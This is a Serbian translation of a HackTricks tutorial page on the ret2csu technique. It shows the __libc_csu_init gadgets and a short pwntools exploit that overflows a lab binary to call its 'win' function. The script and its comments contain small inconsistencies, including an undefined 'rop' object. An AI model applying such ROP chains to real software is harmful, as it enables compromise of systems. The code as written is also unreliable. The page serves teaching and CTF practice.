# Ret2csu

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJE**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

**ret2csu** je hakovanje tehnika koja se koristi kada pokušavate preuzeti kontrolu nad programom, ali ne možete pronaći **gadgete** koje obično koristite za manipulisanje ponašanjem programa.

Kada program koristi određene biblioteke (poput libc), ima neke ugrađene funkcije za upravljanje načinom na koji različiti delovi programa komuniciraju međusobno. Među ovim funkcijama postoje neke skrivene dragocenosti koje mogu delovati kao naši nedostajući gadgeti, posebno jedna nazvana `__libc_csu_init`.

### Čarobni Gadgeti u \_\_libc\_csu\_init

U `__libc_csu_init`, postoje dve sekvence instrukcija (naši "čarobni gadgeti") koji se ističu:

1. Prva sekvencija nam omogućava postavljanje vrednosti u nekoliko registara (rbx, rbp, r12, r13, r14, r15). To su poput slotova gde možemo čuvati brojeve ili adrese koje želimo koristiti kasnije.

```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```

Ova sprava nam omogućava kontrolu ovih registara tako što izvlači vrednosti sa steka i smešta ih u njih.

2. Drugi niz koristi vrednosti koje smo postavili da uradi nekoliko stvari:

* **Premesti određene vrednosti u druge registre**, pripremajući ih za korišćenje kao parametre u funkcijama.
* **Izvrši poziv na lokaciju** određenu sabiranjem vrednosti u r15 i rbx, zatim množenjem rbx sa 8.

```
mov rdx, r14;
mov rsi, r13;
mov edi, r12d;
call qword [r15 + rbx*8];
```

## Primer

Zamislite da želite da napravite syscall ili pozovete funkciju poput `write()`, ali vam trebaju specifične vrednosti u registrima `rdx` i `rsi` kao parametri. Obično biste tražili gedžete koji direktno postavljaju ove registre, ali ne možete pronaći nijedan.

Ovde dolazi do izražaja **ret2csu**:

1. **Postavljanje Registara**: Koristite prvi magični gedžet da skine vrednosti sa steka i stavi ih u rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) i r15.
2. **Korišćenje Drugog Gedžeta**: Sa postavljenim registrima, koristite drugi gedžet. Ovo vam omogućava da premestite vaše izabrane vrednosti u `rdx` i `rsi` (iz r14 i r13, redom), pripremajući parametre za poziv funkcije. Štaviše, kontrolišući `r15` i `rbx`, možete naterati program da pozove funkciju smeštenu na adresi koju izračunate i stavite u `[r15 + rbx*8]`.

Imate [**primer korišćenja ove tehnike i objašnjenje ovde**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), a ovo je konačan eksploit koji je korišćen:

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```

{% hint style="warning" %}
Imajte na umu da prethodni exploit nije namenjen za **`RCE`**, već samo da pozove funkciju nazvanu `win` (uzimanje adrese `win` sa stdin pozivanjem gets u ROP lancu i čuvanje u r15) sa trećim argumentom vrednosti `0xdeadbeefcafed00d`.
{% endhint %}

### Zašto ne koristiti libc direktno?

Obično su ovi slučajevi takođe ranjivi na [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), ali ponekad morate kontrolisati više parametara nego što se lako može kontrolisati pomoću gedžeta koje direktno pronađete u libc-u. Na primer, funkcija `write()` zahteva tri parametra, a **pronaći gedžete za postavljanje svih ovih direktno možda nije moguće**.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili **telegram grupi**]\(https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
